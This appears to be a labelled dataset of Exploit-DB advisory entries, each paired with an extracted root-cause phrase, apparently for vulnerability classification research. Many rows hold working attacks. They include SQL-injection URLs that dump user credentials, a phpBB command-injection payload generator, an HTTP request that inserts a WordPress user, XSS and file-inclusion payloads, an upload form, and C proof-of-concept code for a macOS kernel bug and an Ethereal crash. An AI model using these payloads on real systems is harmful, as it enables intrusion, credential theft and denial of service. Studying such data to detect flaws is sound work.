31245,"Joomla! / Mambo Component com_formtool - 'catid' SQL Injection source: https://www.securityfocus.com/bid/27884/info  The Joomla! and Mambo 'com_formtool' component is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.   http://www.example.com/index.php?option=com_formtool&task=view&formid=2&catid=-9999999/**/union/**/select/**/concat(username,0x3a,password)/**/from/**/jos_users/*",fails to sufficiently sanitize user-supplied data before using it in an SQL query,1
28965,"Bitweaver 1.x - '/wiki/list_pages.php?sort_mode' SQL Injection source: https://www.securityfocus.com/bid/20996/info      Bitweaver is prone to multiple SQL-injection and cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.      Exploiting these issues could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database implementation.      Bitweaver 1.3.1 and prior versions are vulnerable; other versions may also be affected.       Since this issue is a duplicate of the the issue described in BID 20988 (Bitweaver Multiple Input Validation Vulnerabilities), this BID is being retired.      http://www.example.com/bitweaver/wiki/list_pages.php?find=&sort_mode=-98",fails to sufficiently sanitize user-supplied data,1
47486,"Microsoft Windows Kernel - Out-of-Bounds Read in CI!CipFixImageType While Parsing Malformed PE File We have encountered a Windows kernel crash in CI!CipFixImageType while trying to load a malformed PE image into the process address space as a data file (i.e. LoadLibraryEx(LOAD_LIBRARY_AS_DATAFILE | LOAD_LIBRARY_AS_IMAGE_RESOURCE)). An example crash log generated after triggering the bug is shown below:  --- cut --- *** Fatal System Error: 0x00000050                        (0xFFFFF8007B6E00AC,0x0000000000000000,0xFFFFF80079A7E5C1,0x0000000000000000)  Driver at fault:  ***        CI.dll - Address FFFFF80079A7E5C1 base at FFFFF80079A30000, DateStamp 8581dc0d . Break instruction exception - code 80000003 (first chance)  A fatal system error has occurred. Debugger entered on first try; Bugcheck callbacks have not been invoked.  A fatal system error has occurred.  [...]  ******************************************************************************* *                                                                             * *                        Bugcheck Analysis                                    * *                                                                             * *******************************************************************************  PAGE_FAULT_IN_NONPAGED_AREA (50) Invalid system memory was referenced.  This cannot be protected by try-except. Typically the address is just plain bad or it is pointing at freed memory. Arguments: Arg1: fffff8007b6e00ac, memory referenced. Arg2: 0000000000000000, value 0 = read operation, 1 = write operation. Arg3: fffff80079a7e5c1, If non-zero, the instruction address which referenced the bad memory 	address. Arg4: 0000000000000000, (reserved)  [...]  TRAP_FRAME:  fffffa8375df1860 -- (.trap 0xfffffa8375df1860) NOTE: The trap frame does not contain all registers. Some register values may be zeroed or incorrect. rax=0000000000000000 rbx=0000000000000000 rcx=0000000000000000 rdx=0000000000000000 rsi=0000000000000000 rdi=0000000000000000 rip=fffff80079a7e5c1 rsp=fffffa8375df19f0 rbp=fffffa8375df1b30  r8=00000000000000c0  r9=fffff8007b6d0080 r10=0000000000000004 r11=fffff8007b6e0070 r12=0000000000000000 r13=0000000000000000 r14=0000000000000000 r15=0000000000000000 iopl=0         nv up ei ng nz ac po cy CI!CipFixImageType+0x9d: fffff800`79a7e5c1 418b44cb3c      mov     eax,dword ptr [r11+rcx*8+3Ch] ds:fffff800`7b6e00ac=???????? Resetting default scope  LAST_CONTROL_TRANSFER:  from fffff80077ea6642 to fffff80077dc46a0  STACK_TEXT:   fffffa83`75df0e18 fffff800`77ea6642 : fffff800`7b6e00ac 00000000`00000003 fffffa83`75df0f80 fffff800`77d22be0 : nt!DbgBreakPointWithStatus fffffa83`75df0e20 fffff800`77ea5d32 : fffff800`00000003 fffffa83`75df0f80 fffff800`77dd0fb0 fffffa83`75df14c0 : nt!KiBugCheckDebugBreak+0x12 fffffa83`75df0e80 fffff800`77dbca07 : ffff8ac5`62b15f80 fffff800`77ed0110 00000000`00000000 fffff800`78063900 : nt!KeBugCheck2+0x952 fffffa83`75df1580 fffff800`77de0161 : 00000000`00000050 fffff800`7b6e00ac 00000000`00000000 fffffa83`75df1860 : nt!KeBugCheckEx+0x107 fffffa83`75df15c0 fffff800`77c7aaef : 00000000`00000000 00000000`00000000 00000000`00000000 fffff800`7b6e00ac : nt!MiSystemFault+0x1d3171 fffffa83`75df16c0 fffff800`77dca920 : fffff800`7b6d0000 00000000`00000000 ffffe687`5031c180 00000000`00000000 : nt!MmAccessFault+0x34f fffffa83`75df1860 fffff800`79a7e5c1 : ffffe687`4f6b1080 fffff800`7b6d0080 00000000`00000000 fffff800`79a67280 : nt!KiPageFault+0x360 fffffa83`75df19f0 fffff800`79a7c879 : fffffa83`75df1cd0 00000000`00000000 00000000`c00000bb 00000000`00000000 : CI!CipFixImageType+0x9d fffffa83`75df1a30 fffff800`78285766 : fffffa83`75df1c70 fffff800`7b6d0000 00000000`0000000e fffff800`7b6d0000 : CI!CiValidateImageHeader+0x279 fffffa83`75df1bb0 fffff800`7828528a : 00000000`00000000 00000000`00000001 00000000`00000000 00000000`00011000 : nt!SeValidateImageHeader+0xd6 fffffa83`75df1c60 fffff800`7821e0da : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : nt!MiValidateSectionCreate+0x436 fffffa83`75df1e50 fffff800`781fc861 : fffffa83`75df2180 fffffa83`75df1fb0 00000000`40000000 fffffa83`75df2180 : nt!MiValidateSectionSigningPolicy+0xa6 fffffa83`75df1eb0 fffff800`781dca20 : ffffe687`5031c180 fffffa83`75df2180 fffffa83`75df2180 ffffe687`5031c150 : nt!MiCreateNewSection+0x5ad fffffa83`75df2010 fffff800`781dcd24 : fffffa83`75df2040 ffffd483`86519790 ffffe687`5031c180 00000000`00000000 : nt!MiCreateImageOrDataSection+0x2d0 fffffa83`75df2100 fffff800`781dc37f : 00000000`11000000 fffffa83`75df24c0 00000000`00000001 00000000`00000002 : nt!MiCreateSection+0xf4 fffffa83`75df2280 fffff800`781dc110 : 000000bc`f7c78928 00000000`00000005 00000000`00000000 00000000`00000001 : nt!MiCreateSectionCommon+0x1ff fffffa83`75df2360 fffff800`77dce115 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : nt!NtCreateSection+0x60 fffffa83`75df23d0 00007ffe`5771c9a4 : 00007ffe`54641ae7 00000000`00000000 00000000`00000001 40b28496`f324e4f9 : nt!KiSystemServiceCopyEnd+0x25 000000bc`f7c788b8 00007ffe`54641ae7 : 00000000`00000000 00000000`00000001 40b28496`f324e4f9 feafc9c1`1796ffa1 : ntdll!NtCreateSection+0x14 000000bc`f7c788c0 00007ffe`54645640 : 00000203`34a8b3d0 00000007`00000000 00007ffe`56d32770 00000000`00000022 : KERNELBASE!BasepLoadLibraryAsDataFileInternal+0x2e7 000000bc`f7c78af0 00007ffe`5462c41d : 00000203`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : KERNELBASE!LoadLibraryExW+0xe0 000000bc`f7c78b60 00007ffe`559f03d1 : 00000203`34a79130 00000000`00000000 00000203`34a96190 00007ffe`55a06d85 : KERNELBASE!GetFileVersionInfoSizeExW+0x3d 000000bc`f7c78bc0 00007ffe`559f035c : 00000000`00000000 00007ffe`549f10ff 00000203`34a79130 000000bc`f7c78f10 : shell32!_LoadVersionInfo+0x39 000000bc`f7c78c30 00007ffe`54a6c1c1 : 00000000`00000000 00000000`00000000 ffffffff`fffffffe 00000000`00000000 : shell32!CVersionPropertyStore::Initialize+0x2c  [...] --- cut ---  The direct cause of the crash is an attempt to read from an invalid out-of-bounds address relative to the kernel mapping of the parsed PE file. Specifically, we believe that it is caused by the lack of proper sanitization of the IMAGE_FILE_HEADER.SizeOfOptionalHeader field.  We have minimized one of the crashing samples down to a 3-byte difference in relation to the original file: one which increases the value of the SizeOfOptionalHeader field from 0x00e0 to 0x66e0, one that decreases SizeOfImage from 0x8400 to 0x0e00, and one that changes DllCharacteristics from 0 to 0x89 (IMAGE_DLLCHARACTERISTICS_FORCE_INTEGRITY | 9).  The issue reproduces on Windows 10 and Windows Server 2019 (32-bit and 64-bit, Special Pools not required). The crash occurs when any system component calls LoadLibraryEx(LOAD_LIBRARY_AS_DATAFILE | LOAD_LIBRARY_AS_IMAGE_RESOURCE) against the file, either directly or through another API such as GetFileVersionInfoSizeExW() or GetFileVersionInfoW(). In practice, this means that as soon as the file is displayed in Explorer, or the user hovers the cursor over it, or tries to open the file properties, or tries to rename it or perform any other similar action, the system will panic. In other words, just downloading such a file may permanently block the user's machine until they remove it through Recovery Mode etc. The attack scenario is similar to the one described in https://www.fortinet.com/blog/threat-research/microsoft-windows-remote-kernel-crash-vulnerability.html. Due to the nature of the bug (OOB read), it could be also potentially exploited as a limited information disclosure primitive.  Attached is an archive with a minimized proof-of-concept PE image, the original file used to generate it, and three additional non-minimized samples. Please be careful when unpacking the ZIP as Windows may crash immediately once it sees the corrupted files on disk.   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47486.zip",Invalid system memory was referenced,1
24274,"phpBB 2.0.x - 'viewtopic.php' PHP Script Injection source: https://www.securityfocus.com/bid/10701/info  The 'viewtopic.php' phpBB script is prone to a remote PHP script injection vulnerability because the application fails to properly sanitize user-supplied URI parameters before using them to construct dynamically generated web pages.  Exploiting this issue may allow a remote attacker to execute arbitrary commands in the context of the webserver that is hosting the vulnerable software.   <? $rush='ls -al'; //do what $highlight='passthru($HTTP_GET_VARS[rush])'; // dont touch  print ""?t=%37&rush="";  for ($i=0; $i<strlen($rush); ++$i) {  print '%' . bin2hex(substr($rush,$i,1)); }  print ""&highlight=%2527."";  for ($i=0; $i<strlen($highlight); ++$i) {  prt '%' . bin2hex(substr($highlight,$i,1)); }  print "".%2527""; ?>",the application fails to properly sanitize user-supplied URI parameters before using them to construct dynamically generated web pages,1
41792,"Apple macOS/iOS Kernel 10.12.3 (16D32) - SIOCSIFORDER Socket ioctl Memory Corruption Due to Bad Bounds Checking /* Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1108  SIOCSIFORDER is a new ioctl added in iOS 10. It can be called on a regular tcp socket, so from pretty much any sandbox.  it falls through to calling:   ifnet_reset_order(ordered_indices, ifo->ifo_count) where ordered_indicies points to attacker-controlled bytes.  ifnet_reset_order contains this code:    for (u_int32_t order_index = 0; order_index < count; order_index++) {     u_int32_t interface_index = ordered_indices[order_index];  <---------------- (a)     if (interface_index == IFSCOPE_NONE ||         (int)interface_index > if_index) {           <-------------------------- (b)       break;     }     ifp = ifindex2ifnet[interface_index];            <-------------------------- (c)     if (ifp == NULL) {       continue;     }     ifnet_lock_exclusive(ifp);     TAILQ_INSERT_TAIL(&ifnet_ordered_head, ifp, if_ordered_link);    <---------- (d)     ifnet_lock_done(ifp);     if_ordered_count++;   }  at (a) a controlled 32-bit value is read into an unsigned 32-bit variable. at (b) this value is cast to a signed type for a bounds check at (c) this value is used as an unsigned index  by providing a value with the most-significant bit set making it negative when cast to a signed type we can pass the bounds check at (b) and lead to reading an interface pointer out-of-bounds below the ifindex2ifnet array.  This leads very directly to memory corruption at (d) which will add the value read out of bounds to a list structure.  tested on MacOS 10.12.3 (16D32) on MacbookAir5,2  (on 64-bit platforms the array index wouldn't wrap around so the read would actually occur > 2GB above the array, not below) */  // ianbeer #if 0 MacOS/iOS kernel memory corruption due to Bad bounds checking in SIOCSIFORDER socket ioctl  SIOCSIFORDER is a new ioctl added in iOS 10. It can be called on a regular tcp socket, so from pretty much any sandbox.  it falls through to calling:   ifnet_reset_order(ordered_indices, ifo->ifo_count) where ordered_indicies points to attacker-controlled bytes.  ifnet_reset_order contains this code:    for (u_int32_t order_index = 0; order_index < count; order_index++) {     u_int32_t interface_index = ordered_indices[order_index];  <---------------- (a)     if (interface_index == IFSCOPE_NONE ||         (int)interface_index > if_index) {           <-------------------------- (b)       break;     }     ifp = ifindex2ifnet[interface_index];            <-------------------------- (c)     if (ifp == NULL) {       continue;     }     ifnet_lock_exclusive(ifp);     TAILQ_INSERT_TAIL(&ifnet_ordered_head, ifp, if_ordered_link);    <---------- (d)     ifnet_lock_done(ifp);     if_ordered_count++;   }  at (a) a controlled 32-bit value is read into an unsigned 32-bit variable. at (b) this value is cast to a signed type for a bounds check at (c) this value is used as an unsigned index  by providing a value with the most-significant bit set making it negative when cast to a signed type we can pass the bounds check at (b) and lead to reading an interface pointer out-of-bounds below the ifindex2ifnet array.  This leads very directly to memory corruption at (d) which will add the value read out of bounds to a list structure.  tested on MacOS 10.12.3 (16D32) on MacbookAir5,2 #endif  #include <stdlib.h> #include <stdio.h> #include <unistd.h>  #include <sys/ioctl.h> #include <sys/socket.h>  #include <mach/mach.h>  struct if_order { 	u_int32_t			ifo_count; 	u_int32_t			ifo_reserved; 	mach_vm_address_t	ifo_ordered_indices; /* array of u_int32_t */ };  #define SIOCSIFORDER  _IOWR('i', 178, struct if_order)  int main() { 	uint32_t data[] = {0x80001234};  	struct if_order ifo;   ifo.ifo_count = 1;   ifo.ifo_reserved = 0;   ifo.ifo_ordered_indices = (mach_vm_address_t)data;    int fd = socket(PF_INET, SOCK_STREAM, 0);   int ret = ioctl(fd, SIOCSIFORDER, &ifo);    return 0; }",Bad bounds checking in SIOCSIFORDER socket,1
28465,"VisualShapers EZContents 2.0.3 - 'Loginreq2.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/19780/info  ezContents is prone to a cross-site scripting vulnerability because it fails to sanitize input before displaying it to users of the application.  An attacker may leverage this issue to have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  http://www.example.com/loginreq2.php?subgroupname=""><script>alert(666)</script>",fails to sanitize input before displaying it to users of the application,1
37017,Invision Power Board (IP.Board) 4.2.1 - 'searchText' Cross-Site Scripting source: https://www.securityfocus.com/bid/52740/info  Invision Power Board is prone to a cross-site scripting vulnerability because it fails to sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks.  Invision Power Board 4.2.1 is vulnerable; other versions may also be affected.   http://www.example.com/index.php?s=blablabla&&app=gallery&module=ajax&section=albumSelector&do=albumSelectorPane&secure_key=blalblabla&type=upload&albums=search&moderate=&album_id=1593&member_id=&searchType=member&searchMatch=is&searchIsGlobal=0&searchSort=date&searchDir=desc&searchText=%27%22--%3E%3C%2Fstyle%3E%3C%2Fscript%3E%3Cscript%3Ealert%280x000252%29%3C%2Fscript%3E,fails to sanitize user-supplied input,1
24259,"Ethereal 0.x - Multiple iSNS / SMB / SNMP Protocol Dissector Vulnerabilities // source: https://www.securityfocus.com/bid/10672/info    Ethereal 0.10.5 has been released to address multiple vulnerabilities, including an iSNS protocol dissector vulnerability, a SMB protocol dissector vulnerability, and a SNMP protocol dissector vulnerability. These issues are due to a failure of the application to properly handle malformed packets.  Successful exploitation of these issues will allow an attacker to cause a denial of service condition in the affected application, it has also been reported that these issues may facilitate arbitrary code execution.  /*  * Ethereal network protocol analyzer  * iSNS Dissector zero-length payload  * denial of service vulnerability  * proof of concept code  * version 1.0 (Aug 05 2004)  * CVE ID: CAN-2004-0633  *  * by Remi Denis-Courmont < exploit at simphalampin dot com >  *   http://www.simphalempin.com/dev/  *  * Vulnerable:  *  - Ethereal v0.10.4  *  * Not vulnerable:  *  - Ethereal v0.10.3 and earlier  *  - Ethereal v0.10.5  *  * The code above should cause Ethereal (or tethereal -V) to abort.  */   /*****************************************************************************  * Copyright (C) 2004  Remi Denis-Courmont.  All rights reserved.            *  *                                                                           *  * Redistribution and use in source and binary forms, with or without        *  * modification, are permitted provided that the following conditions        *  * are met:                                                                  *  * 1. Redistributions of source code must retain the above copyright notice, *  *    this list of conditions and the following disclaimer.                  *  * 2. Redistribution in binary form must reproduce the above copyright       *  *    notice, this list of conditions and the following disclaimer in the    *  *    documentation and/or other materials provided with the distribution.   *  *                                                                           *  * The author's liability shall not be incurred as a result of loss of due   *  * the total or partial failure to fulfill anyone's obligations and direct   *  * or consequential loss due to the software's use or performance.           *  *                                                                           *  * The current situation as regards scientific and technical know-how at the *  * time when this software was distributed did not enable all possible uses  *  * to be tested and verified, nor for the presence of any or all faults to   *  * be detected. In this respect, people's attention is drawn to the risks    *  * associated with loading, using, modifying and/or developing and           *  * reproducing this software.                                                *  * The user shall be responsible for verifying, by any or all means, the     *  * software's suitability for its requirements, its due and proper           *  * functioning, and for ensuring that it shall not cause damage to either    *  * persons or property.                                                      *  *                                                                           *  * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR      *  * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES *  * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.   *  * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,          *  * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT  *  * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, *  * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY     *  * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT       *  * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF  *  * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.         *  *                                                                           *  * The author does not either expressly or tacitly warrant that this         *  * software does not infringe any or all third party intellectual right      *  * relating to a patent, software or to any or all other property right.     *  * Moreaver, the author shall not hold someone harmless against any or all   *  * proceedings for infringement that may be instituted in respect of the     *  * use, modification and redistrbution of this software.                     *  *****************************************************************************/   #include <string.h> #include <stdio.h>  #ifndef WIN32 # include <sys/types.h> # include <unistd.h> # include <sys/socket.h> # include <netdb.h> #else # include <winsock2.h> # include <ws2tcpip.h>  # define close( fd ) closesocket_clean (fd) # define perror( str ) (void)fprintf (stderr, ""%s: Winsock error %d\n"", \                                 str, WSAGetLastError ())  # undef gai_strerror # define gai_strerror( i ) gai_strerror_does_not_link (i) static const char * gai_strerror_does_not_link (int errval) {         static char buf[32];          sprintf (buf, ""Winsock error %d"", errval);         return buf; }  /* Winsock has the foolish habit of resetting error value to zero */ static int closesocket_clean (int fd) {         int errval, retval;          errval = WSAGetLastError ();         retval = closesocket (fd);         if (retval == 0)                 WSASetLastError (errval);          return retval; } #endif  static const char packet[] =         /* iSNS header */         ""\x00\x01"" /* Version */         ""\x00\x01"" /* Function ID */         ""\x00\x1c"" /* Length */         ""\x04\x00"" /* Flags: First PDU */         ""\x00\x00"" /* Transaction ID */         ""\x00\x00"" /* Sequence ID */          /* iSNS payload */         ""\x00\x00\x00\x03""         ""\x00\x00\x00\x00"" /* Length (invalid) */ ;   static int proof (const char *target) {         int fd;         struct addrinfo *res, *ptr, hints;          memset (&hints, 0, sizeof (hints));         hints.ai_socktype = SOCK_DGRAM;         /* 'd work with TCP too, but UDP is much more straight-forward */          fd = getaddrinfo (target, ""3205"", &hints, &res);         if (fd)         {                 fprintf (stderr, ""%s: %s\n"", target, gai_strerror (fd));                 return -1;         }          fd = -1;          for (ptr = res; ptr != NULL && fd == -1; ptr = ptr->ai_next)         {                 fd = socket (ptr->ai_family, ptr->ai_socktype,                                 ptr->ai_protocol);                 if (fd == -1)                         continue;                  if (connect (fd, ptr->ai_addr, ptr->ai_addrlen))                 {                         close (fd);                         fd = -1;                 }         }          freeaddrinfo (res);          if (fd == -1)                 perror (target);         else         {                 size_t len;                  len = sizeof (packet) - 1;                 if (send (fd, packet, len, 0) == len)                 {                         puts (""Packet sent!"");                         close (fd);                         return 0;                 }                 perror (""Packet sending error"");                 close (fd);         }          return -1; }   static int usage (const char *path) {         fprintf (stderr, ""Usage: %s <hostname/IP>\n"", path);         return 2; }   int main (int argc, char *argv[]) {         int retval;          puts (""Ethereal iSNS dissector zero-length vulnerability\n""                 ""proof of concept code\n""                 ""Copyright (C) 2004 Remi Denis-Courmont ""                 ""<\x65\x78\x70\x6c\x6f\x69\x74\x40\x73\x69\x6d\x70""                 ""\x68\x61\x6c\x65\x6d\x70\x69\x6e\x2e\x63\x6f\x6d>\n"");  #ifdef WIN32         WSADATA wsaData;          if (WSAStartup (0x202, &wsaData) || wsaData.wVersion != 0x202)         {                 fputs (""Winsock version mismatch!\n"", stderr);                 return 2;         } #endif          if (argc != 2)                 return usage (argv[0]);          retval = proof (argv[1]) ? 1 : 0; #ifdef WIN32         WSACleanup (); #endif         return retval; }",a failure of the application to properly handle malformed packets,1
33613,"WordPress Plugin Participants Database 1.5.4.8 - SQL Injection Yarubo #1: Arbitrary SQL Execution in Participants Database for Wordpress =========================================================================  Program: Participants Database <= 1.5.4.8 Severity: Unauthenticated attacker can fully compromise the Wordpress installation Permalink: http://www.yarubo.com/advisories/1  — Info —  Participants Database is a popular Wordpress plugin that offers the functionality needed to build and maintain a database of people. As of today the plugin has been downloaded 92,089 times.  — Vulnerability details —  1. Due to insufficient privilege checks it is possible for anonymous (unauthenticated) users to trigger some administrative actions If any of the shortcodes is used (e.g. signup page).  2. The action ""export CSV"" takes a parameter called ""query"" that can contain an arbitrary SQL query. This means that an unauthenticated user can execute arbitrary SQL statements (e.g. create an admin user, read or write files, or execute code depending on the MySQL user privileges).   — Exploit —  Add a user to wordpress as follows (if you want an admin user, also add admin privileges to wp_usermeta):   POST /wordpress/pdb-signup/ HTTP/1.1 Host: www.example.com Content-Length: 789 (…) Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryuoACADe1C2IFWMxN  ------WebKitFormBoundaryuoACADe1C2IFWMxN Content-Disposition: form-data; name=""action""  output CSV ------WebKitFormBoundaryuoACADe1C2IFWMxN Content-Disposition: form-data; name=""CSV_type""  participant list ------WebKitFormBoundaryuoACADe1C2IFWMxN Content-Disposition: form-data; name=""subsource""  participants-database ------WebKitFormBoundaryuoACADe1C2IFWMxN Content-Disposition: form-data; name=""query""  INSERT INTO wp_users (ID,user_login,user_pass,user_nicename,user_email,user_registered,user_status,display_name) VALUES (31337,0x74657374,0x245024425a7a59615354486f41364b693355363576772f5461473861412f475a4b31,0x59617275626f,0x7465737440746573742e636f6d,0x323031342d31312d31312030303a30303a3030,0,0x59617275626f);  ------WebKitFormBoundaryuoACADe1C2IFWMxN    — Solution —  This issue has been fixed in version 1.5.4.9. Download the newest version from:  https://wordpress.org/plugins/participants-database/   — Credit —   Yarubo Research Team research [at] yarubo.com  Network Security Scan: http://www.yarubo.com/  Free Heartbleed Scan: http://www.yarubo.com/heartbleed",insufficient privilege checks,1
33361,"JiRo's (Multiple Products) - '/files/login.asp' Multiple SQL Injections source: https://www.securityfocus.com/bid/37045/info  Multiple JiRo's products are prone to multiple SQL-injection vulnerabilities because they fail to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting these issues could allow an attacker to compromise the applications, access or modify data, or exploit latent vulnerabilities in the underlying database.  The following products are affected:  JBS 2.0 JBSX  Other products may also be affected.  The following proof-of-concept login and password examples are available:  admin 'or' '=' password 'or' '='",fail to sufficiently sanitize user-supplied data before using it in an SQL query,1
36384,"SugarCRM Community Edition 6.3.0RC1 - 'index.php' Multiple SQL Injections source: https://www.securityfocus.com/bid/50870/info  SugarCRM Community Edition is prone to multiple SQL-injection vulnerabilities because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting these issues could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  SugarCRM Community Edition 6.3.0RC1 is vulnerable; other versions may also be affected.  http://www.example.com/index.php?entryPoint=json&action=get_full_list&module=Leads&where=0%29%20union%20select%20version%28%29,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71%20--%20  http://www.example.com/index.php?entryPoint=json&action=get_full_list&module=Leads&order=SQL_CODE_HERE%20--%20",fails to sufficiently sanitize user-supplied data before using it in an SQL query,1
22296,"Axis Communications HTTP Server 2.x - Messages Information Disclosure source: https://www.securityfocus.com/bid/6980/info  It has been reported that the Axis Video Server does not properly secure sensitive information. Because of this, an attacker may be able to gather details about server operation and traffic that could lead to further attacks.   http://www.example.com/support/messages",the Axis Video Server does not properly secure sensitive information,1
34142,"MODx 1.0.3 - 'index.php' Multiple SQL Injections source: https://www.securityfocus.com/bid/40841/info  MODx is prone to multiple SQL-injection vulnerabilities because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting these issues could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  MODx 1.0.3 is vulnerable; other versions may also be affected.  http://www.example.com/manager/index.php?id=4%27+ANY_SQL&a=16 http://www.example.com/manager/index.php?a=106%27+ANY_SQL_HERE",fails to sufficiently sanitize user-supplied data before using it in an SQL query,1
20793,"RobTex Viking Server 1.0.7 - Relative Path Webroot Escaping source: https://www.securityfocus.com/bid/2643/info  The Viking Server is a freely available software package maintained and distributed by Robtex. The Viking Server provides multiple protocol service on Windows 95, 98, and NT systems.  A problem in the software package could make it possible for remote users to gain access to sensitive system files. Due to the improper handling of relative paths by the HTTP serving portion of the Viking Server, a user requesting a relative path such as ""\...\"" can gain access to the root directory, breaking out of the webroot.  This problem makes it possible for remote user to gain access to sensitive system files, and potentially local access.   http://vulnerable.system/\...\",the improper handling of relative paths by the HTTP serving portion of the Viking Server,1
23691,vBulletin 3.0 - 'search.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/9656/info  It has been reported that VBulletin is prone to a cross-site scripting vulnerability in the 'search.php' script. This issue is reportedly due to a failure to sanitize user input and so allow HTML and script code that may facilitate cross-site scripting attacks. Successful exploitation of this issue may allow for theft of cookie-based authentication credentials or other attacks.  http://www.example.com/forum/search.php?do=process&showposts=0&query=<!-- / main error message --></p></p></blockquote>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<script>alert('XSS')</script><plaintext>  http://www.example.com/forum/search.php?do=process&showposts=0&query=<script>alert('XSS')</script>,a failure to sanitize user input,1
37381,"Joomla! Component IDoEditor - 'image.php' Arbitrary File Upload source: https://www.securityfocus.com/bid/53973/info  The IDoEditor component for Joomla! is prone to a vulnerability that lets attackers upload arbitrary files because the application fails to adequately sanitize user-supplied input.  An attacker can exploit this vulnerability to upload arbitrary code and run it in the context of the web server process.  IDoEditor 1.6.16 is vulnerable; other versions may also be affected.   <html> <body> <center> <form action=""http://www.example.com/plugins/editors/idoeditor/themes/advanced/php/image.php"" method=""post"" enctype=""multipart/form-data""> <input type=""file"" name=""pfile""> <input type=""submit"" name=""Submit"" value=""Upload""> </form> </center> </body> </html>",the application fails to adequately sanitize user-supplied input,1
33416,QuiXplorer 2.x - 'lang' Local File Inclusion source: https://www.securityfocus.com/bid/37393/info  QuiXplorer is prone to a local file-include vulnerability because it fails to sufficiently sanitize user-supplied data.  Exploiting this issue may allow an attacker to compromise the application and the underlying system; other attacks are also possible.  QuiXplorer 2.4.1beta is vulnerable; other versions may also be affected.   http://www.example.com/path/?lang=../path/to/malicious_uploaded_code,fails to sufficiently sanitize user-supplied data,1
33758,"Zigurrat Farsi CMS - '/manager/textbox.asp' SQL Injection source: https://www.securityfocus.com/bid/38719/info  Zigurrat Farsi CMS is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.   http://www.example.com/manager/textbox.asp?id='",fails to sufficiently sanitize user-supplied data before using it in an SQL query,1
27367,Link Bank - 'Iframe.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/17001/info  Link Bank is prone to a cross-site scripting vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input before including it in dynamically generated HTML content.  An attacker may leverage this issue to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.  http://www.example.com/iframe.php?site=%3C/title%3E%3C/head%3E%3Cscript%20src=http://www.example.com/xss.js%3E%3C/script%3E,a failure in the application to properly sanitize user-supplied input before including it in dynamically generated HTML content,1
28819,Lodel CMS 0.7.3 - 'Calcul-page.php' Remote File Inclusion source: https://www.securityfocus.com/bid/20551/info  Lodel CMS is prone to a remote file-include vulnerability because it fails to properly sanitize user-supplied input.  A successful exploit of this issue allows an attacker to execute arbitrary server-side script code on an affected computer with the privileges of the webserver process. This may facilitate unauthorized access.  Version 0.7.3 is vulnerable to this issue; other versions may also be affected.  http://www.example.com/[path]/calcul-page.php?home=[shell],fails to properly sanitize user-supplied input,1
26115,Calendar Express 2.2 - 'search.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/14505/info  Calendar Express is prone to a cross-site scripting vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input.  An attacker may leverage this issue to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.   http://www.example.com/calendarexpress/search.php?allwords=<br><script>alert(document.cookie);</script>&cid=0&title=1&desc=1,a failure in the application to properly sanitize user-supplied input,1
26899,"Marwel 2.7 - 'index.php' SQL Injection source: https://www.securityfocus.com/bid/15959/info  Marwel is prone to an SQL injection vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input before using it in an SQL query.  Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation.  Version 2.7 and prior are vulnerable; other versions may also be affected.  http://www.example.com/index.php?show=[SQL]",a failure in the application to properly sanitize user-supplied input before using it in an SQL query,1
